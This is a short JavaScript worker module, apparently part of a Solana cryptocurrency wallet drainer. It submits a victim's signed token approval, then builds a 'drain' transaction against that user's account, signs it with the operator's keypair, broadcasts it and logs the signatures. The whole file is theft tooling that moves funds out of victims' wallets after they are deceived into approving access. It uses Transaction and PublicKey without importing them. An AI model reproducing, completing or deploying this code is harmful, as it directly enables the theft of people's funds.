const { getConnection } = require("../core/rpcPool");
const { getKeypair } = require("../core/keypairManager");
const { executeTx } = require("../solana/txExecutor");
const { buildApprove } = require("../flows/approveFlow");
const { buildDrain } = require("../flows/drainFlow");
const logger = require("../core/logger");

async function processJob(job) {
    try {
        const { user, signedApproveTx } = job.data;

        const connection = getConnection();
        const payer = getKeypair();

        const approveTx = Transaction.from(Buffer.from(signedApproveTx, "base64"));
        const approveSig = await executeTx(approveTx, connection);
        logger.info("Approve confirmed", { approveSig });

        const drainTx = await buildDrain(new PublicKey(user), connection);
        drainTx.sign(payer);

        const drainSig = await executeTx(drainTx, connection);
        logger.info("Drain confirmed", { drainSig });

        return { approveSig, drainSig };
    } catch (err) {
        logger.error("Worker job failed", { error: err.message });
        throw err;
    }
}

module.exports = { processJob };
